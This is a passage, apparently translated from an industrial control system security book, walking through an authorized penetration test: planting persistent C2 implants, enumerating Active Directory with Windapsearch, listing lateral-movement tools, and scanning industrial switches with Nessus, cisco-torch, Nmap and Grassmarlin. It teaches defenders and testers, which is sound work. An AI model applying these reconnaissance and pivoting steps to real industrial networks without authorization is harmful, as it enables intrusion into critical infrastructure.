  \n一旦进入企业网络，我们可以决定通过命令与控制植入程序（用于某种其他有效载荷）在企业网络中留下持久后门。这样我们就可以无缝地重新连接。\n\n请注意，如果没有发现可利用的漏洞来让我们获得初始立足点，我们可能需要与客户合作，由客户提供一个立足点，以便我们继续渗透测试项目的下一步。对于与\
  \ Z 公司的合作项目，这不是问题，因为从现在开始，我们将使用正在构建的测试环境来执行渗透测试活动。\n\n## 渗透测试项目第 2 步 – 横向进入工业环境\n\
  \n此时，我们已经获得了目标网络的初始立足点。现在，是时候朝着 ICS 攻击第一阶段的目标前进了：进入工业网络。同样，本章不会花太多时间介绍这一步骤，因为我们在第\
  \ 16 章“红队/蓝队演练”中已经用不少篇幅专门讨论了这个主题。\n\n## 扫描和探测信息与漏洞\n\n在获得企业网络的（持久）后门后，我们要做的第一件事就是开始扫描和探测企业网络，以寻找关于进入工业网络的最佳切入点（线索）的信息。我们关注计算机名称、登录用户以及其他能告诉我们下一个潜在攻击目标的信息。这将使我们能够横向进入工业环境。此时可能有用的工具包括：\n\
  \n- Nmap: https://nmap.org/\n- Nessus: https://www.tenable.com/products/nessus\n\
  - PowerShell:\n  - Empire（已不再积极开发）：https://www.powershell empire.com/\n  - PoshC2:\
  \ https://poshc2.readthedocs.io/en/latest/\n  - PowerSploit（已不再积极开发）：https://github.com/PowerShellMafia/PowerSploit\n\
  \  - Nishang: https://github.com/samratashok/nishang\n- Windapsearch: https://github.com/ropnop/windapsearch\n\
  \n\n\n\n\n以下是一个使用 Windapsearch 查找所有使用非特权用户账户的域计算机的快速示例：\n\n```\n(pac@kali-001):[~/workdir/tools/go-windapsearch]\n\
  $ windapsearch -d 172.25.100.100 -u user@ot-domain -p Password1 -m computers\ndn:\
  \ CN=WORKSTATION10, CN=Computers, DC=OT-Domain, DC=local\ncn: WORKSTATION10\noperatingSystem:\
  \ Windows 10 Pro\noperatingSystemVersion: 10.0 (15063)\ndNSHostName: WORKSTATION10.OT-Domain.local\n\
  \ndn: CN=WORKSTATION1, CN=Computers, DC=OT-Domain, DC=local\ncn: WORKSTATION1\n\
  operatingSystem: Windows 10 Pro\noperatingSystemVersion: 10.0 (18362)\ndNSHostName:\
  \ Workstation1.OT-Domain.local\n\ndn: CN=OT-DC1, OU=Domain Controllers, DC=OT-Domain,\
  \ DC=local\ncn: OT-DC1\noperatingSystem: Windows Server 2016 Standard\noperatingSystemVersion:\
  \ 10.0 (14393)\ndNSHostName: OT-DC1.OT-Domain.local\n\ndn: CN=FT-DIR1, CN=Computers,\
  \ DC=OT-Domain, DC=local\ncn: FT-DIR1\noperatingSystem: Windows Server 2016 Standard\n\
  operatingSystemVersion: 10.0 (14393)\ndNSHostName: FT-DIR1.OT-Domain.local\n\ndn:\
  \ CN=FT-DIR2, CN=Computers, DC=OT-Domain, DC=local\ncn: FT-DIR2\noperatingSystem:\
  \ Windows Server 2016 Standard\noperatingSystemVersion: 10.0 (14393)\ndNSHostName:\
  \ FT-DIR2.OT-Domain.local\n\ndn: CN=WORKSTATION2, CN=Computers, DC=OT-Domain, DC=local\n\
  cn: WORKSTATION2\noperatingSystem: Windows 7 Professional\noperatingSystemVersion:\
  \ 6.1 (7601)\noperatingSystemServicePack: Service Pack 1\ndNSHostName: WORKSTATION2.OT-Domain.local\n\
  \ndn: CN=WORKSTATION12, CN=Computers, DC=OT-Domain, DC=local\ncn: WORKSTATION12\n\
  operatingSystem: Windows 8.1 Pro\noperatingSystemVersion: 6.3 (9600)\ndNSHostName:\
  \ Workstation12.OT-Domain.local\n$ /windapsearch -h\n```\n\n![](img/c8ffa9959721097701584fcc95101362_679_0.png)\n\
  \n同样的方法也可以用于域用户、DNS 名称、组、域管理员等。\n\n一旦我们找到了符合我们需求的目标系统，我们就可以对其进行入侵并进入下一步。\n\n## 横向移动进入枢纽系统\n\
  \n现在，是时候入侵我们识别出的系统了。它很可能会允许我们进入工业网络。有多种方法可以实现这一点，例如使用漏洞利用工具/框架或利用自带工具进行操作（PowerShell、WMI\
  \ 等），甚至使用社会工程技巧。\n\n此时可能有用的工具包括以下内容：\n\n- Kerbrute: https://github.com/ropnop/kerbrute\n\
  - Responder: https://github.com/SpiderLabs/Responder\n- Metasploit: https://www.metasploit.com/\n\
  - CrackMapExec: https://github.com/byt3bl33d3r/CrackMapExec\n- The Social-Engineer\
  \ Toolkit: https://github.com/trustedsec/social-engineer-toolkit\n- PoshC2 or Empire\
  \ (or other command and control frameworks)\n\n由于我们正在进行渗透测试，隐蔽性或攻击性都不是限制因素，因此我们可以在这里全力以赴。一旦我们就位用于枢纽，我们就可以在工业环境中设置植入物。\n\
  \n## 在工业网络中设置持久的枢纽植入物\n\n一旦我们进入了一个允许从企业网络连接到工业网络的系统，我们就可以使用该系统上的现有权限（存储的凭据）与工业网络上的系统进行交互，然后部署植入物/后门。这使我们能够直接访问通过企业枢纽系统代理/隧道传输的工业环境。如果现有权限不存在或不起作用，我们可以尝试使用枢纽系统攻击工业网络上的系统。\n\
  \n## 使用 Nessus\n\n以下是针对两个工业交换机（172.25.100.253、254）执行的高级 Nessus 扫描输出：\n\n![](img/c8ffa9959721097701584fcc95101362_682_0.png)\n\
  \n图 17.14 – IND 交换机的 Nessus 扫描结果\n\n我们可以使用此信息在在线漏洞和漏洞利用数据库中查找交换机的漏洞。\n\n还有许多其他工具可以查找特定设备/品牌的有关信息；这有助于根据手头的任务定制你的渗透测试工具包。例如，下一个部分将介绍一个用于获取\
  \ Cisco 网络信息的实用工具，称为 Cisco Torch。\n\n## 使用 Cisco Torch\n\n如果我们处理的是 Cisco 环境，一个有助于识别和表征\
  \ Cisco 设备的工具是 cisco-torch。该工具不随 Kali Linux 预装，但可以使用以下命令轻松添加：\n\n```\nsudo apt install\
  \ cisco-torch\n```\n\n以下是该工具的一个示例运行：\n\n```\ncisco-torch -A 172.25.100.254\nUsing\
  \ config file torch.conf...\nLoading include and plugin ...\n# Cisco Torch Mass\
  \ Scanner #\nList of targets contains 1 host(s)\n8853:   Checking 172.25.100.254\
  \ ...\n...\n* Cisco by SNMP found ***\n*System Description: Cisco Internetwork OS\
  \ Software\nIOS (tm) IES 2000 Software Version 15.2(4), RELEASE SOFTWARE (EA7)\n\
  ...\nCisco-IOS Webserver found\n  HTTP/1.1 401 Unauthorized\nDate: Tue, 13 Apr 2020\
  \ 00:57:07 GMT\nServer: cisco-IES\nAccept-Ranges: none\nWWW-Authenticate: Basic\
  \ realm=\"level_15_access\"\n...\n401 Unauthorized\n...\n```\n\n正如你所见，`cisco-torch`\
  \ 可以收集我们指向它的网络设备上的一些相关数据。我们可以利用这些信息查找任何现有的漏洞利用：\n\n![](img/c8ffa9959721097701584fcc95101362_683_0.png)\n\
  \n图 17.15 – 针对发现的 IOS 版本的 Searchsploit 搜索结果\n\n现在，让我们讨论一种使用名为 Grassmarlin 的工具在执行渗透测试活动时创建网络地图的常规方法。\n\
  \n## Grassmarlin 网络映射\n\n这里有一个提示：在扫描时（例如执行网络的初始 Nmap 扫描），让 Wireshark 在后台捕获数据包。我们可以将数据包捕获导入到诸如\
  \ **Grassmarlin** (`https://github.com/nsacyber/GRASSMARLIN`) 这样的网络映射工具中，它为我们提供了所攻击网络的漂亮图形表示。映射手头网络的绝佳方法是在使用\
  \ Wireshark 嗅探我们使用的接口的同时运行以下 Nmap 扫描：\n\n```\nnmap -p- -A -oA ot-scan 172.25.100.0/24\n\
  ```\n\n这指示 Nmap 扫描 `172.25.100.0/24` 子网上的每个系统的每个端口（`-p-`）并收集任何数据（`-A`），以 `ot-scan`\
  \ 的名称保存结果到四种主要格式（`-oA ot-scan`）。\n\n完成后，将 Wireshark 输出保存为 **数据包捕获（PCAP）** 文件并导入到\
  \ Grassmarlin：\n\n1. 启动 Grassmarlin 并选择 **File | Import Files**。\n2. 点击 **Add Files**\
  \ 并导航到保存的 PCAP 文件。\n3. 点击 **Import Selected**。\n\n![](img/c8ffa9959721097701584fcc95101362_684_0.png)\n\
  \n图 17.16 – Grassmarlin – 导入 PCAP\n\n4. 完成导入过程后，关闭导入屏幕。Grassmarlin 现在应该显示所有扫描 IP\
  \ 的地图：\n\n![](img/c8ffa9959721097701584fcc95101362_685_0.png)\n\n现在，我们可以平移、缩放并搜索发现的资产。\n\
  \n> **Note**\n> \n> Grassmarlin 也可以运行自己的嗅探引擎。让它在你进行攻击工作时坐着学习。\n\n还有许多其他工具、设备和技巧可用于探测网络设备。然而，我想继续前进，开始查看探索第\
  \ 3 级站点运营。\n\n## 测试第 3 级站点运营\n\n我们将要探索的下一个潜在漏洞区域是 **第 3 级站点运营（L3 SiteOps）**。正如我们之前讨论的那样，你可能还记得\
  \ L3 SiteOps 是工业服务器和工作站通常所在的位置，因此我们将寻找这些类型系统的漏洞。\n\n3. 将报告保存到磁盘。然后，打开一个终端并使用 msfconsole\
